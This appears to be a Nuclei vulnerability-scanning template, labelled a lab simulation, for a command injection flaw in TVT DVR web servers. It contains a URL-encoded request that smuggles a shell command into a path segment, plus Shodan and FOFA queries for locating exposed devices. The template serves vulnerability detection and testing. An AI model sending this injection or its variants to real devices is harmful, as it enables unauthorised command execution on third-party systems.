id: CVE-2025-34036
info:
  name: "TVT DVR - Command Injection (Safe Simulation)"
  author: "Prabhukiran161"
  severity: critical
  description: |
    Safe lab simulation of TVT DVR Cross Web Server Command Injection.
    Flow:
      1) Fingerprint the server
      2) Trigger harmless language-based injection to create /tmp/poc.txt
      3) Fetch /poc.txt to verify proof of concept
    Note: Although HTTP-based, this template is valid because the TVT DVR Cross Web Server
    is an embedded HTTP service and the vulnerability occurs in its URI path processing.
  reference:
    - "https://www.exploit-db.com/exploits/39596"
    - "https://web.archive.org/web/20160322204109/http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html"
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
    cvss-score: 10.0
    cve-id: CVE-2025-34036
    cwe-id: CWE-78
  metadata:
    simulation: "true"
    safe: "true"
    verified: "true"
    kev: "true"
    shodan-query: "html:\"/language/en/index.html\""
    fofa-query: "body=\"/language/en/index.html\""
    max-request: 3
  tags:
    - rce
    - simulation
    - tvt
    - dvr
    - lab

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Cross Web Server - TVT DVR"
      - type: status
        status:
          - 200

  - raw:
      - |
        GET /language/Swedish%24%28echo%20poc-content%20%3E%20%2Ftmp%2Fpoc.txt%29 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Executed:"

  - raw:
      - |
        GET /poc.txt HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '^poc-content$'
      - type: status
        status:
          - 200
